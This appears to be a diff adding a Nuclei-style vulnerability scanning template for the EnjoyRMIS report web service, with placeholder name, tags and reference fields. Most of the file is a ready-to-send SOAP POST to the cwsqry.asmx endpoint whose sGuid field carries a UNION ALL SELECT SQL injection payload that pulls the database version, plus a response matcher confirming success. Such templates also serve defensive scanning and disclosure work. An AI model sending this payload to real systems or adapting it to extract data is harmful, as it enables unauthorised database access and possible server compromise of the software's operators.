@@ -1,0 +1,34 @@
+id: EnjoyRMIS-cwsqry-sqli
+info:
+  name: Template Name
+  author: wangzong
+  severity: high
+  description: EnjoyRMIS GetChildGroupSql1存在SQL注入漏洞,攻击者可通过该漏洞获取数据库敏感信息甚至可控制服务器。
+  reference:
+    - https://
+  tags: tags
+http:
+  - raw:
+      - |
+        POST /EnjoyRMIS_WS/WS/ReportTool/cwsqry.asmx HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: text/xml; charset=utf-8
+        Content-Length: 604
+        SOAPAction: "http://tempuri.org/GetChildGroupSql1"
+
+        <?xml version="1.0" encoding="utf-8"?>
+        <soap:Envelope xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:xsd="http://www.w3.org/2001/XMLSchema" xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/">
+          <soap:Body>
+            <GetChildGroupSql1 xmlns="http://tempuri.org/">
+              <sGuid>1') UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,(select @@version),NULL,NULL-- jhpF</sGuid>
+
+            </GetChildGroupSql1>
+
+          </soap:Body>
+
+        </soap:Envelope>
+    matchers:
+      - type: word
+        part: body
+        words:
+          - 'nvarchar'
